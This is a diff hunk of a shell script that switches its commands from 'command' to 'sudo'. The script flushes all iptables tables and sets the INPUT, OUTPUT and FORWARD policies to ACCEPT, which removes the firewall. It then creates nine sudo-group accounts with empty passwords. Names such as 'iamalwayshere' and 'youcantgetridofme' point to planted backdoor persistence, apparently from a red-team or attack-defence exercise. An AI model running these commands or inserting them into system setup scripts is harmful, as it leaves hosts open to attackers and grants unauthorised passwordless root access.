@@ -9,25 +9,25 @@
 source ~/.bashrc
 
 # Flush iptables rules
-command iptables -F
-command iptables -t mangle -F
-command iptables -t nat -F
-command iptables -t filter -F
-command iptables -t raw -F
-command iptables -t security -F
+sudo iptables -F
+sudo iptables -t mangle -F
+sudo iptables -t nat -F
+sudo iptables -t filter -F
+sudo iptables -t raw -F
+sudo iptables -t security -F
 
 # Change default policies for 'iptables'
-command iptables -P INPUT ACCEPT
-command iptables -P OUTPUT ACCEPT
-command iptables -P FORWARD ACCEPT
+sudo iptables -P INPUT ACCEPT
+sudo iptables -P OUTPUT ACCEPT
+sudo iptables -P FORWARD ACCEPT
 
 # Add some admin users
-command useradd -M devbl -p "" -G sudo
-command useradd -M bob -p "" -G sudo
-command useradd -M susan -p "" -G sudo
-command useradd -M kat -p "" -G sudo
-command useradd -M simon -p "" -G sudo
-command useradd -M batman -p "" -G sudo
-command useradd -M iamalwayshere -p "" -G sudo
-command useradd -M youcantgetridofme -p "" -G sudo
-command useradd -M hehe -p "" -G sudo
+sudo useradd -M devbl -p "" -G sudo
+sudo useradd -M bob -p "" -G sudo
+sudo useradd -M susan -p "" -G sudo
+sudo useradd -M kat -p "" -G sudo
+sudo useradd -M simon -p "" -G sudo
+sudo useradd -M batman -p "" -G sudo
+sudo useradd -M iamalwayshere -p "" -G sudo
+sudo useradd -M youcantgetridofme -p "" -G sudo
+sudo useradd -M hehe -p "" -G sudo
